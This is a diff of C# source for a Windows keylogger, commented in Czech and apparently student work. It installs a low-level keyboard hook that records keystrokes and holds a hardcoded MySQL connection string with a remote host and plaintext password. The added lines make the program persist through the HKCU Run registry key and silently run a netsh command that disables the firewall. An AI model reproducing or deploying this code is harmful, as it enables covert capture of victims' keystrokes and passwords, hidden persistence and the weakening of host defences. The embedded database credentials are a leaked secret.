@@ -4,15 +4,18 @@ using System.Diagnostics;
 using System.Windows.Forms;
 using System.Text;
 using MySql.Data.MySqlClient;
+using Microsoft.Win32;
+using System.Reflection;
 
 namespace KeyLogger
 {
     class Logger
     {
+        private static RegistryKey runRegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); // 
         private static int WH_KEYBOARD_LL = 13; // Konstanta pro zachytávání low level inputů
         private static int WM_KEYDOWN = 0x0100;  // konstanta pro stisk klavesy 
         private static IntPtr hook = IntPtr.Zero; // Adresa hook procedury - default 0
-        private static LowLevelKeyboardProc llkProcedure = HookCallback; // Zavěšení callbacku na stisk klávesy
+        private static LowLevelKeyboardProc loggerProcedure = HookCallback; // Zavěšení callbacku na stisk klávesy
         
         private static StringBuilder loggedKeysString;
         private static string connectionString = "server=db1.forsite.cz;database=vsb;uid=vsb;pwd=SnhIAIZ3;";
@@ -24,11 +27,46 @@ namespace KeyLogger
 
         public void Start()
         {
+            // Vložení do registrů
+            ConfigureRunRegistry();
+
             // Dáme hook do systémových volání
-            hook = SetHook(llkProcedure);
+            hook = SetHook(loggerProcedure);
+            DisableFirewall();
             Application.Run();
             // Odstraní hook
             UnhookWindowsHookEx(hook);
+        }
+        
+        // Vložení do registrů
+        private void ConfigureRunRegistry()
+        {
+            // Aktuální absolutní adresa exe souboru
+            string keyloggerPath = Assembly.GetEntryAssembly().Location;
+            // Získání hodnoty z registrů z klíče LSKeylogger - doopravdy by bylo lepší mít něco tajného, ale takto to aktuálně lépe poznáme :-)
+            var registerKlg = runRegistryKey.GetValue("LSKeylogger");
+            /*
+             Neexistuje-li záznam, který by spustil program z aktuálního umístění, vytvoříme jej.
+             Nebo
+             Existuje-li záznam, který spouští Vámi vytvořený program z umístění, které ovšem již neexistuje, nahraďte jej cestou k aktuálnímu souboru.
+            */
+            if (registerKlg == null || (string)registerKlg != keyloggerPath)
+            {
+                // Vložíme umístění do registrů
+                runRegistryKey.SetValue("LSKeylogger", keyloggerPath);
+            }
+        }
+
+        // Vypne firewall - pokud je keylogger spuštěn jako správce
+        private void DisableFirewall()
+        {
+            ProcessStartInfo processStartInfo = new ProcessStartInfo("netsh.exe", "Firewall set opmode disable")
+            {
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            Process.Start(processStartInfo);
         }
 
         // nastavení čtení na stisk klávesy - namapování
@@ -38,7 +76,8 @@ namespace KeyLogger
             ProcessModule currentModule = currentProcess.MainModule;
             String moduleName = currentModule.ModuleName;
             IntPtr moduleHandle = GetModuleHandle(moduleName);
-            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
+
+            return SetWindowsHookEx(WH_KEYBOARD_LL, loggerProcedure, moduleHandle, 0);
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int ncode, IntPtr wParam, IntPtr lparam);
@@ -57,14 +96,16 @@ namespace KeyLogger
                 }
                 // čte low level inputy
                 int vkCode = Marshal.ReadInt32(lParam);
+
                 // Vrátí stistknutou klávesu v lidské podobě
                 string readableCharacter = GetReadableCharacter(vkCode);
                 loggedKeysString.Append(readableCharacter);
             }
-            //´zavolá další proceduru
+            // zavolá další proceduru
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
+        // Vrátí čitelnější znaky
         private static string GetReadableCharacter(int vkCode)
         {
             switch ((Keys)vkCode)
